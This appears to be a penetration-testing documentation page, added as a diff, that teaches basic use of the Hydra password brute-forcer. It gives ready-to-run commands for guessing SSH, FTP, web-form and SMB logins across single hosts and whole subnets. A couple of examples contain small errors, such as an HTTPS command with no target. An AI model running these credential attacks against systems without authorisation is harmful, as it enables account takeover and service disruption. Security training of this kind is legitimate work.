@@ -1,0 +1,222 @@
+---
+title: Hydra Basic Usage
+description: Learn the fundamental commands and options for using Hydra effectively
+---
+
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
+import { Steps, Step } from "@/components/markdown/steps"
+import { Note } from "@/components/markdown/note"
+
+# Hydra Basic Usage
+
+This guide covers the essential commands and options for using Hydra effectively in your penetration testing workflow. We'll walk through basic usage patterns, command structure, and provide practical examples for common scenarios.
+
+## Getting Started
+
+<Steps>
+  <Step title="Verify Installation">
+    First, ensure Hydra is properly installed on your system:
+    
+    ```bash
+    hydra -h
+    ```
+    
+    This should display the help menu with all available options.
+  </Step>
+  <Step title="Understand Command Structure">
+    The basic Hydra command structure is:
+    
+    ```bash
+    hydra [options] [-s PORT] TARGET PROTOCOL [MODULE-OPTIONS]
+    ```
+    
+    Where:
+    - `[options]` are general Hydra options
+    - `[-s PORT]` specifies a non-default port
+    - `TARGET` is the target host(s)
+    - `PROTOCOL` is the protocol to attack
+    - `[MODULE-OPTIONS]` are protocol-specific options
+  </Step>
+  <Step title="Prepare Wordlists">
+    Before starting an attack, prepare your username and password lists:
+    
+    ```bash
+    # Example username list
+    echo -e "admin\nroot\nuser" > usernames.txt
+    
+    # Example password list
+    echo -e "password\nadmin123\nqwerty" > passwords.txt
+    ```
+    
+    For real attacks, use more comprehensive wordlists like those in `/usr/share/wordlists/` on Kali Linux.
+  </Step>
+</Steps>
+
+## Basic Attack Examples
+
+### SSH Attack
+
+To perform a basic SSH brute force attack:
+
+```bash
+# Single username, password list
+hydra -l admin -P passwords.txt ssh://192.168.1.100
+
+# Username list, single password
+hydra -L usernames.txt -p password123 ssh://192.168.1.100
+
+# Username and password lists
+hydra -L usernames.txt -P passwords.txt ssh://192.168.1.100
+```
+
+### Web Form Attack
+
+For attacking a web login form:
+
+```bash
+# POST form attack
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
+
+# GET form attack
+hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/login.php:username=^USER^&password=^PASS^:Login failed"
+```
+
+<Note>
+The http-post-form and http-get-form modules require three parameters separated by colons:
+1. The page URL path
+2. The form parameters with ^USER^ and ^PASS^ placeholders
+3. The error message indicating a failed login attempt
+</Note>
+
+### FTP Attack
+
+For attacking an FTP server:
+
+```bash
+# Basic FTP attack
+hydra -L usernames.txt -P passwords.txt ftp://192.168.1.100
+
+# FTP on non-standard port
+hydra -L usernames.txt -P passwords.txt -s 2121 ftp://192.168.1.100
+```
+
+## Common Options
+
+### Parallelism Control
+
+Control the number of parallel connections:
+
+```bash
+# 16 parallel connections per target (default)
+hydra -l admin -P passwords.txt ssh://192.168.1.100
+
+# 4 parallel connections per target
+hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100
+
+# 64 parallel connections total across all targets
+hydra -l admin -P passwords.txt -T 64 -M targets.txt ssh
+```
+
+<Note>
+Using too many parallel connections can cause service disruption or trigger security alerts. Start with lower values and increase gradually if needed.
+</Note>
+
+### Output Control
+
+Control and save the output:
+
+```bash
+# Save results to a file
+hydra -l admin -P passwords.txt ssh://192.168.1.100 -o results.txt
+
+# Save in JSON format
+hydra -l admin -P passwords.txt ssh://192.168.1.100 -o results.json -b json
+
+# Verbose output
+hydra -l admin -P passwords.txt -v ssh://192.168.1.100
+
+# Very verbose output
+hydra -l admin -P passwords.txt -V ssh://192.168.1.100
+```
+
+### Exit Conditions
+
+Control when Hydra stops:
+
+```bash
+# Exit after finding first valid credential
+hydra -l admin -P passwords.txt -f ssh://192.168.1.100
+
+# Exit after finding N valid credentials
+hydra -l admin -P passwords.txt -F -o found.txt ssh://192.168.1.100
+```
+
+## Practical Examples
+
+### Multiple Targets
+
+Attack multiple targets simultaneously:
+
+```bash
+# IP range
+hydra -l admin -P passwords.txt 192.168.1.0/24 ssh
+
+# From file
+echo -e "192.168.1.100\n192.168.1.101" > targets.txt
+hydra -l admin -P passwords.txt -M targets.txt ssh
+```
+
+### Username:Password Combinations
+
+Use colon-separated username:password combinations:
+
+```bash
+# Create combinations file
+echo -e "admin:password\nroot:toor\nuser:123456" > combos.txt
+
+# Attack with combinations
+hydra -C combos.txt ssh://192.168.1.100
+```
+
+### Empty and Special Passwords
+
+Try empty passwords and username-as-password:
+
+```bash
+# Try null password, same as username, and reversed username
+hydra -L usernames.txt -e nsr ssh://192.168.1.100
+```
+
+## Troubleshooting
+
+### Connection Issues
+
+If you're experiencing connection problems:
+
+```bash
+# Increase timeout (default is 30 seconds)
+hydra -l admin -P passwords.txt -w 60 ssh://192.168.1.100
+
+# Decrease connection attempts per second
+hydra -l admin -P passwords.txt -c 10 ssh://192.168.1.100
+```
+
+### Service-Specific Issues
+
+Some services may require additional configuration:
+
+```bash
+# HTTPS with SSL
+hydra -l admin -P passwords.txt -S https-post-form "/:user=^USER^&pass=^PASS^:F=incorrect"
+
+# Windows SMB with domain
+hydra -l admin -P passwords.txt smb://192.168.1.100/domain
+```
+
+## Next Steps
+
+Once you've mastered the basic usage of Hydra, explore the following topics:
+
+- [Supported Protocols](/docs/hydra/core-operations/supported-protocols) - Learn about all the protocols Hydra supports
+- [Attack Options](/docs/hydra/core-operations/attack-options) - Discover advanced attack configuration options
+- [Performance Tuning](/docs/hydra/advanced-techniques/performance-tuning) - Optimize Hydra for speed and efficiency
